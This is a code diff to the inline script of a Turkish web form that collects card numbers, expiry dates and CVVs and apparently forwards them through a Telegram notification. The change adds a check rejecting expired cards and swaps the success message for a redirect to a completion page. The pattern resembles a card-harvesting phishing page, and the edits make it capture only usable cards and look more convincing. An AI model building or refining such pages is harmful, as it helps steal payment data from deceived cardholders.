@@ -553,6 +553,27 @@
           return;
         }
 
+        // Son kullanma tarihi validasyonu - geçmiş tarih olamaz
+        const currentDate = new Date();
+        const currentYear = currentDate.getFullYear() % 100; // Son 2 hanesi (örn: 24)
+        const currentMonth = currentDate.getMonth() + 1; // 1-12
+        const inputYear = parseInt(sonKullanimYil);
+        const inputMonth = parseInt(sonKullanimAy);
+
+        // Yıl kontrolü - şu anki yıldan küçük olamaz
+        // Örnek: Şu an 2024 ise (24), 23 veya daha küçük geçersiz
+        if (inputYear < currentYear) {
+          alert('Kart son kullanma tarihi geçmiş bir tarih olamaz. Lütfen geçerli bir tarih giriniz.');
+          return;
+        }
+
+        // Eğer şu anki yıl ise, ay da geçmiş olmamalı
+        // Örnek: Şu an Aralık 2024 ise, 11/24 veya daha küçük geçersiz
+        if (inputYear === currentYear && inputMonth < currentMonth) {
+          alert('Kart son kullanma tarihi geçmiş bir tarih olamaz. Lütfen geçerli bir tarih giriniz.');
+          return;
+        }
+
         if (!cvv || cvv.length !== 3) {
           alert('Lütfen geçerli bir CVV numarası giriniz (3 haneli)');
           return;
@@ -595,20 +616,8 @@
           console.error('Telegram bildirim hatası:', error);
         });
 
-        // Başarılı mesajı
-        alert('Kart bilgileriniz başarıyla kaydedilmiştir. Teşekkür ederiz!');
-        
-        // Formu temizle ve gizle
-        document.getElementById('kartNumarasi').value = '';
-        document.getElementById('sonKullanimAy').value = '';
-        document.getElementById('sonKullanimYil').value = '';
-        document.getElementById('cvv').value = '';
-        
-        // Formu gizle
-        document.getElementById('krediKartiForm').style.display = 'none';
-        
-        // Başvuru formunu tekrar göster (opsiyonel)
-        // document.getElementById('basvuruForm').style.display = 'block';
+        // Başvuru tamamlandı - tamamlandi.html'ye yönlendir
+        window.location.href = '/tamamlandi.html';
       });
     });
   </script>
